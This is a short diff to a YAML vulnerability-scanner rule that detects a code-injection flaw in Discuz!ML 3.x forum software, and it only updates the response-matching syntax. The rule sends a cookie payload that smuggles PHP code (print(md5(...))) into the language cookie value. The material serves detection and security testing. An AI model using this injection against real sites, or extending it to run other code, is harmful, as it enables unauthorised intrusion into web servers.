@@ -6,7 +6,7 @@ rules:
     path: /forum.php
     follow_redirects: false
     expression: |
-      status==200
+      response.status==200
     search: cookiepre = '(?P<token>[\w_]+)'
   - method: GET
     path: /forum.php
@@ -14,7 +14,7 @@ rules:
       Cookie: "{{token}}language=sc'.print(md5({{r1}})).'"
     follow_redirects: false
     expression: |
-      status == 200 && body.bcontains(bytes(md5(string(r1))))
+      response.status == 200 && response.body.bcontains(bytes(md5(string(r1))))
 detail:
   author: X.Yang
   Discuz_version: Discuz!ML 3.x
